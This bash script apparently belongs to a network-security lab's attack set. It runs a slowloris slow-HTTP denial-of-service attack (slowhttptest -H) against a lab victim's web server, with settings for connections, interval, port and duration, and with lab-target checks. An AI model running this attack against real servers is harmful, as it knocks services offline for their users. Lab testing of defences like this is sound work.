#!/usr/bin/env bash
# slowloris (slowhttptest -H) against the lab victim's web server. Attacker host only.
#   bash lab/attacks/slowloris.sh --target <victim-ip> --pi-ip IP --victim-net CIDR --protected-net CIDR \
#        [--connections 150] [--interval 10] [--port 80] [--duration 60] [--dry-run]
source "$(dirname "${BASH_SOURCE[0]}")/_common.sh"
parse_common "$@"
CONNECTIONS=150
INTERVAL=10
PORT=80
set -- "${REST[@]}"
while (($#)); do
  case "$1" in
    --connections) CONNECTIONS="${2:?}"; shift ;;
    --interval) INTERVAL="${2:?}"; shift ;;
    --port) PORT="${2:?}"; shift ;;
    *) no_extra_args "$@" ;;
  esac
  shift
done
require_lab_target
require_number "$CONNECTIONS" "--connections"
require_number "$INTERVAL" "--interval"
require_number "$PORT" "--port"
tool_version slowhttptest
run_attack slowhttptest -H -c "$CONNECTIONS" -i "$INTERVAL" -r 50 -l "${DURATION%.*}" -u "http://${DEST}:${PORT}/"
